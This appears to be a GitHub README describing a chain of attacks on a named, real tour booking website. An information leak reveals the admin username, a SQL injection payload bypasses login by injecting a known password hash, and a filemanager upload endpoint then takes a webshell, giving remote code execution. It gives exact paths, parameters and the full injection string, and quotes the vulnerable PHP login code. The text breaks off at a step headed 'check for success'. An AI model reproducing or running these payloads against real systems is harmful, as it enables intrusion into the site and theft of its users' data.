# ISIC RCE details

Multiple vulnerabilities in isic.lk tour booking website (info leak / SQL Injection / file upload ) lead to RCE.

First we get website admin username with information disclosure vulnerability, then we use sqli to bypass login, and finally we upload a webshell to target's local system.

## 1.info leak

path: /system/user/modules/mod\_users/controller.php

post param: action=view

[![image-20220403212351104](/killmonday/isic.lk-RCE/raw/main/img/image-20220403212351104.png)](/killmonday/isic.lk-RCE/blob/main/img/image-20220403212351104.png)

now we get an account username 'admin'.

## 2.bypass login

we use sql injection to bypass login and make our PHPSESSION (in cookie) work.

path: /system/user/modules/mod\_users/controller.php

post param: action=doLogin&username=admin' union select 1,2,3,4,5,6,'0192023a7bbd73250516f069df18b500',8,9 limit 1,1#&password=admin123

[![image-20220403212851591](/killmonday/isic.lk-RCE/raw/main/img/image-20220403212851591.png)](/killmonday/isic.lk-RCE/blob/main/img/image-20220403212851591.png)

tips: in file '/system/user/modules/mod\_users/helper.php' you will see the login logic like follow code :

```
      function selectByUsername() {
            $this->MDatabase->select($this->table_name, "*", "username='" . $this->username() . "'", "id DESC");
            return $this->MDatabase->result;
      }

```

and '/system/user/modules/mod\_users/controller.php':

[![image-20220403213757554](/killmonday/isic.lk-RCE/raw/main/img/image-20220403213757554.png)](/killmonday/isic.lk-RCE/blob/main/img/image-20220403213757554.png)

It means we could not bypass login with something like `username=admin' and 1=1 -- -` , but we could use 'union select' to set password's md5 with function 'selectByUsername()' . Now we can bypass login based on the number of fields with 'user' table which we actually know , set the value of 'password' to some string's md5 that we know like 'admin123' , it will return `{"code":"200","msg":"Successfully Logged In. Please Wait..."}`.

## 3.upload webshell

For some reason, you need to make a request with '/system/application/libs/js/tinymce/plugins/filemanager/dialog.php?type=0&editor=mce\_0&field\_id=selected\_file' otherwise the upload will fail. So we send a GET request :

[![image-20220403220347982](/killmonday/isic.lk-RCE/raw/main/img/image-20220403220347982.png)](/killmonday/isic.lk-RCE/blob/main/img/image-20220403220347982.png)

Now upload webshell.

path: /system/application/libs/js/tinymce/plugins/filemanager/upload.php

[![image-20220403221057746](/killmonday/isic.lk-RCE/raw/main/img/image-20220403221057746.png)](/killmonday/isic.lk-RCE/blob/main/img/image-20220403221057746.png)

check for success:
